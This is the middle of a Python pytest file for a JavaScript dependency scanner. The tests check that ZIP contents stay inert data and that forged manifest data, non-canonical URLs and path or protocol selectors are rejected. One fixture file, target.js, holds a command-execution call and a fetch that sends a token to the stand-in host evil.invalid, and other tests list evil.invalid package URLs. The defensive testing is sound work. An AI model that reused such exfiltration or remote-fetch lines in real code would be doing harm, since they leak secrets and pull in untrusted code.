    assert (code, stdout, stderr) == (1, "", "scanner_failed:cli_runtime_failed\n")


def test_neg_b1_js_014_no_node_npm_network_target_import_or_bypass_open(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """NEG-B1-JS-014: JS source in the ZIP remains data, never executable capability."""
    archive = _write_zip(
        tmp_path,
        {
            "package.json": '{"dependencies":{"a":"1.0.0"}}',
            "target.js": b"require('child_process').exec('npm install'); fetch('https://evil.invalid/token=secret')",
        },
    )
    original_import = builtins.__import__

    def guarded_import(name, *args, **kwargs):
        if name in {"node", "npm", "target"} or name.startswith(("node.", "npm.", "target.")):
            raise AssertionError(f"unexpected target import: {name}")
        return original_import(name, *args, **kwargs)

    def forbidden(*args, **kwargs):
        raise AssertionError("unexpected side effect")

    monkeypatch.setattr(builtins, "__import__", guarded_import)
    monkeypatch.setattr(socket, "socket", forbidden)
    monkeypatch.setattr(subprocess, "run", forbidden)
    monkeypatch.setattr(subprocess, "Popen", forbidden)
    monkeypatch.setattr(os, "system", forbidden)
    code, stdout, stderr = _cli_js(archive)
    assert code == 0 and stderr == ""
    assert "target.js" not in stdout and "secret" not in stdout
    assert json.loads(stdout)["components"][0]["name"] == "a"


def test_neg_b1_js_015_a2_integrity_consumer_and_cleanup_error_priority(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """NEG-B1-JS-015: A2 errors dominate consumer output and leave normal paths empty."""
    workspace = tmp_path / "a2-errors"
    workspace.mkdir()
    bad = tmp_path / "bad.zip"
    bad.write_bytes(b"not a ZIP")
    out, err = io.StringIO(), io.StringIO()
    assert cli.main(["--javascript-dependencies", str(bad)], stdout=out, stderr=err, clock=lambda: FIXED) == 1
    assert out.getvalue() == "" and err.getvalue() == "invalid_archive:archive_not_zip\n"
    assert list(workspace.iterdir()) == []

    good = _write_zip(tmp_path, {"package.json": '{"dependencies":{"a":"1.0.0"}}'}, "error.zip")
    import app.scanners as scanners

    original_parse = scanners.parse_javascript_manifests
    monkeypatch.setattr(
        scanners,
        "parse_javascript_manifests",
        lambda session: (_ for _ in ()).throw(IngestionSecurityError("scanner_failed", "javascript_manifest_parser_failed")),
    )
    with pytest.raises(IngestionSecurityError) as consumer_error:
        cli.run_local_zip_javascript_dependencies(good, workspace, clock=lambda: FIXED)
    assert str(consumer_error.value) == "scanner_failed:javascript_manifest_parser_failed"
    assert list(workspace.iterdir()) == []
    monkeypatch.setattr(scanners, "parse_javascript_manifests", original_parse)

    import app.ingestion.zip_stream as zip_stream

    original_validate = zip_stream.validate_inventory_snapshot
    calls = {"count": 0}

    def fail_final(workspace_arg, snapshot_arg):
        calls["count"] += 1
        if calls["count"] == 4:
            raise IngestionSecurityError("scanner_failed", "scan_file_integrity_failed")
        return original_validate(workspace_arg, snapshot_arg)

    monkeypatch.setattr(zip_stream, "validate_inventory_snapshot", fail_final)
    with pytest.raises(IngestionSecurityError) as integrity_error:
        cli.run_local_zip_javascript_dependencies(good, workspace, clock=lambda: FIXED)
    assert str(integrity_error.value) == "scanner_failed:scan_file_integrity_failed"


def test_neg_b1_js_016_unsupported_lock_workspace_and_noncompliance_not_extrapolated() -> None:
    """NEG-B1-JS-016: unsupported lock/workspace material stays partial/direct-only."""
    result = _parse(
        {
            "package.json": '{"workspaces":["packages/*"],"dependencies":{"root":"1.0.0"}}',
            "package-lock.json": '{"lockfileVersion":1,"dependencies":{"root":{"version":"1.0.0"},"transitive":{"version":"9.9.9"}}}',
            "npm-shrinkwrap.json": '{"dependencies":{"transitive":{"version":"9.9.9"}}}',
            "yarn.lock": b"transitive@^9.9.9:\n  version \"9.9.9\"\n",
        }
    )
    mapped = map_javascript_manifest_result(result, root_digest=ZERO_DIGEST, observed_at=FIXED)
    assert result.status is JavascriptParseStatus.PARTIAL
    assert [item.name for item in mapped.components] == ["root"]
    assert mapped.components[0].version == "1.0.0"
    assert mapped.components[0].source_url is None
    assert not any("transitive" in item.name for item in mapped.components)
    assert all(item.license_expression_id is None for item in mapped.components)
    assert not hasattr(mapped, "findings")


def test_hardening_strict_json_rejects_nonfinite_constants() -> None:
    """Hardening: NaN, Infinity, and -Infinity are not JSON values."""
    for constant in ("NaN", "Infinity", "-Infinity"):
        result = _parse({"package.json": f'{{"dependencies":{{"a":{constant}}}}}'})
        assert result.status is JavascriptParseStatus.PARTIAL
        assert result.dependencies == ()
        assert [(item.code, item.severity, item.message) for item in result.diagnostics] == [
            ("manifest_json_invalid", "error", "Manifest JSON is invalid.")
        ]


def test_hardening_mapper_rejects_illegal_and_uppercase_npm_names() -> None:
    """Hardening: a hand-built DTO cannot smuggle an invalid npm name into P0."""
    parsed = _parse({"package.json": '{"dependencies":{"a":"1.0.0"}}'})
    original = parsed.dependencies[0]
    for name, locator in (
        ("Bad", "package.json:/dependencies/Bad"),
        ("@Scope/pkg", "package.json:/dependencies/@Scope~1pkg"),
        ("包", "package.json:/dependencies/包"),
        ("bad/name", "package.json:/dependencies/bad~1name"),
    ):
        draft = replace(original.evidence[0], field_locator=locator)
        tampered = replace(original, normalized_name=name, declared_name=name, evidence=(draft,))
        with pytest.raises(IngestionSecurityError) as error:
            map_javascript_manifest_result(
                replace(parsed, dependencies=(tampered,)),
                root_digest=ZERO_DIGEST,
                observed_at=FIXED,
            )
        assert str(error.value) == "scanner_failed:javascript_p0_mapper_failed"


def test_hardening_mapper_rejects_file_path_and_protocol_selectors() -> None:
    """Hardening: manually forged DTO selectors cannot bypass parser safety."""
    parsed = _parse({"package.json": '{"dependencies":{"a":"1.0.0"}}'})
    for selector in (
        "file:../pkg",
        "../pkg",
        "/tmp/pkg",
        "https://evil.invalid/pkg.tgz",
        "npm:other@1.0.0",
        "git+https://evil.invalid/repo.git",
    ):
        tampered = replace(parsed.dependencies[0], requested_spec=selector)
        with pytest.raises(IngestionSecurityError) as error:
            map_javascript_manifest_result(
                replace(parsed, dependencies=(tampered,)),
                root_digest=ZERO_DIGEST,
                observed_at=FIXED,
            )
        assert str(error.value) == "scanner_failed:javascript_p0_mapper_failed"


def test_hardening_mapper_rejects_non_utf8_manifest_order_and_kind_filename_mismatch() -> None:
    """Hardening: manifest order is UTF-8 byte order and filename determines kind."""
    parsed = _parse(
        {
            "z/package.json": '{"dependencies":{"z":"1.0.0"}}',
            "é/package.json": '{"dependencies":{"e":"1.0.0"}}',
        }
    )
    assert [item.relative_path for item in parsed.manifests] == ["z/package.json", "é/package.json"]
    with pytest.raises(IngestionSecurityError) as order_error:
        map_javascript_manifest_result(
            replace(parsed, manifests=tuple(reversed(parsed.manifests))),
            root_digest=ZERO_DIGEST,
            observed_at=FIXED,
        )
    assert str(order_error.value) == "scanner_failed:javascript_p0_mapper_failed"

    forged = replace(parsed.manifests[0], kind=JavascriptManifestKind.PACKAGE_LOCK)
    with pytest.raises(IngestionSecurityError) as kind_error:
        map_javascript_manifest_result(
            replace(parsed, manifests=(forged, parsed.manifests[1])),
            root_digest=ZERO_DIGEST,
            observed_at=FIXED,
        )
    assert str(kind_error.value) == "scanner_failed:javascript_p0_mapper_failed"


def test_hardening_mapper_rejects_cross_directory_lock_and_noncanonical_url() -> None:
    """Hardening: lock evidence must pair with its source directory and canonical URL."""
    parsed = _parse(
        {
            "dir/package.json": '{"dependencies":{"a":"^1.0.0"}}',
            "dir/package-lock.json": '{"lockfileVersion":3,"packages":{"":{"dependencies":{"a":"^1.0.0"}},"node_modules/a":{"version":"1.0.0","resolved":"https://registry.npmjs.org/a.tgz"}}}',
            "other/package-lock.json": '{"lockfileVersion":3,"packages":{}}',
        }
    )
    original = next(item for item in parsed.dependencies if item.source_manifest == "dir/package.json")
    cross_directory = replace(original, lock_manifest="other/package-lock.json")
    with pytest.raises(IngestionSecurityError) as directory_error:
        map_javascript_manifest_result(
            replace(parsed, dependencies=(cross_directory,)),
            root_digest=ZERO_DIGEST,
            observed_at=FIXED,
        )
    assert str(directory_error.value) == "scanner_failed:javascript_p0_mapper_failed"

    noncanonical = replace(original, lock_manifest=None, resolved_version=None, resolved_url="https://REGISTRY.npmjs.org/a/../a.tgz")
    with pytest.raises(IngestionSecurityError) as url_error:
        map_javascript_manifest_result(
            replace(parsed, dependencies=(noncanonical,)),
            root_digest=ZERO_DIGEST,
            observed_at=FIXED,
        )
    assert str(url_error.value) == "scanner_failed:javascript_p0_mapper_failed"
